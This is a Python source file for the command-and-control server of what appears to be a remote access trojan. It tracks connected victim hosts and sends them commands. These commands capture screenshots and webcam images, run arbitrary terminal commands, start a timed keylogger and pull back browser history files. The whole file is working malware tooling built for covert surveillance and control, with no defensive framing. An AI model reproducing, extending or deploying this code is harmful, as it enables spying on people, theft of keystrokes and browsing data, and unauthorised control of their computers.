from connection import Connector
from host import Host
from threading import Thread
from typing import List, Union
from functools import wraps
from pathlib import Path

def check_connection(method):
    @wraps(method)
    def _impl(*args, **kwargs):
        try:
            return True, method(*args, **kwargs)
        except ConnectionResetError:
            args[0].remove_host(args[1])
            return False, "Error on the host connection"
        except TimeoutError as e:
            args[0].remove_host(args[1])
            return False, str(e)
    return _impl

class Server:

    def __init__(self, host:str, port:int) -> None:
        self.__connector = Connector()
        self.__connector.bind((host, port))
        self.__connector.listen()  # enable connections
        self.__hosts:List[Host] = []
        self.__id_auto_increment = 1  # to assign id to host
        

    @property
    def hosts(self)->List[Host]:
        return self.__hosts


    @property
    def connector(self)->Connector:
        return self.__connector

    def get_host_by_id(self, id:int)->Union[Host,None]:
        try:
            for host in self.__hosts:
                if host.id == int(id):
                    return host
            return -1
        except:
            return -1

    def remove_host(self, host:Host):
        try:
            self.__hosts.remove(host)
        except ValueError:
            pass
    
    def __establish_connection(self)->None:
        """Add connectios to server
        """
        while True:
            try:
                conn, addr = self.__connector.accept()
                name = self.__connector.get_str(conn=conn)
                self.__hosts.append(Host(self.__id_auto_increment, conn, addr, name))
                self.__id_auto_increment += 1
                
            except Exception as e:
                if not self.__on:
                    print(">> Server has been disconnected")
                    break
                else:
                    print(str(e))

    def end(self, host:Union[Host,None]=None):
        """Closes all connections"""
        if not host:
            for host in self.__hosts:
                try:
                    self.__connector.send_str("exit", host.sock)
                    host.sock.close()
                except ConnectionResetError:
                    pass
            self.__on = False
            self.__connector.close()
        else:
            self.__connector.send_str("exit", host.sock)
            host.sock.close()
            self.__hosts.remove(host)

    @check_connection
    def screenshot(self, host:Host, name:str=Union[str,None]):
        if not name: name = f"screenshot-{host.id}.png"
        self.__connector.send_str("screenshot", host.sock)
        self.__connector.recv_file(name, host.sock)
        return Path(name).absolute().as_posix()

    @check_connection
    def camera(self, host:Host, name:str=Union[str,None]):
        if not name: name = f"camera-{host.id}.png"
        self.__connector.send_str("camera", host.sock)
        self.__connector.recv_file(name, host.sock)
        return Path(name).absolute().as_posix()

    @check_connection
    def execute_in_terminal(self, host:Host, command):
        self.__connector.send_str(command, host.sock)
        result = self.__connector.get_str(host.sock)
        return result

    def start(self):
        """Stablish socket connections
        """
        Thread(target=self.__establish_connection).start()
        self.__on = True
        print(">> Server has been inicialized")

    @check_connection
    def active_keylogger(self, host:Host, time:int=10):
        self.__connector.send_str("keylogger "+str(time), host.sock)
        return self.__connector.get_str(host.sock)

    @check_connection
    def get_browser_historial(self, host:Host, path_file:Union[str,None]=None, browser:str="edge"):
        if not path_file: path_file = f"historial-{host.name}-{host.id}.csv"
        self.__connector.send_str(f"historial {browser}", host.sock)
        self.__connector.recv_file(path_file, host.sock)
        return Path(path_file).absolute().as_posix()
